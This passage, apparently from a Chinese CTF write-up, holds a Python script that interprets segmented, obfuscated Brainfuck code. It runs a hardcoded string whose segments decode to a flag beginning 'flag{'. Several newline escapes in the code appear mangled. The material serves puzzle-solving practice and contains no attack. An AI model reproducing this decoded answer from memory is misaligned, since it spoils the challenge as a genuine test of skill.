            if tape[ptr] == 0:
                ip = brackets[ip]
        elif cmd == ']':
            if tape[ptr] != 0:
                ip = brackets[ip]
        ip += 1

    # 获取当前 cell 值并转为字符
    char_value = tape[ptr]
    output_log.append(f'MEM[{ptr}] = {char_value}')

    return chr(char_value), output_log

def brainfuck_split_and_decode(code, log_file='bf_log.txt', out_file='bf_output.txt'):
    segments = extract_bf_segments(code)
    result = ""
    logs = []

    for i, segment in enumerate(segments):
        if segment.strip() == "":  # 忽略空段
            continue
        ch, segment_log = run_segment(segment)
        result += ch
        logs.append(f"[Segment {i+1}]nCode: {segment}nOutput Char: {ch}nMemory:n" + "n".join(segment_log) + "n")

    with open(log_file, 'w', encoding='utf-8') as f:
        f.write("n".join(logs))
    with open(out_file, 'w', encoding='utf-8') as f:
        f.write(result)

    print("✅ 提取成功：", result)
    print(f"📄 输出写入：{out_file}, 日志写入：{log_file}")
    return result

bf_code = """>+++++++++++++++++[<++++++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++[<+++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++[<++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++++++[<+++++++>-+-+-+-]<[-]>++++++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++[<++++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>+++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++[<+++++>-+-+-+-]<[-]"""
brainfuck_split_and_decode(bf_code)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-6813268182596ed255e5d2006847eb45.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-d10da609b69daf87d5f8bd78827e72b8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-cb231ab4d0ae43606fc3abb22b302663.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-6ba46351456395e1475b9eca6d06239a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-a6893c4be13876594a1b30920bcf463c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-f093c69f6ad6489aebd939d7659ecab4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-d85582833c4225f20cdfdd89175bc929.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-5520036e503805a7dfd7c437ad0a67c9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-e43b73927b8bd5b5efb01d21993018c0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-b12c5f130a4d7f7833bf43a25e753a4d.png)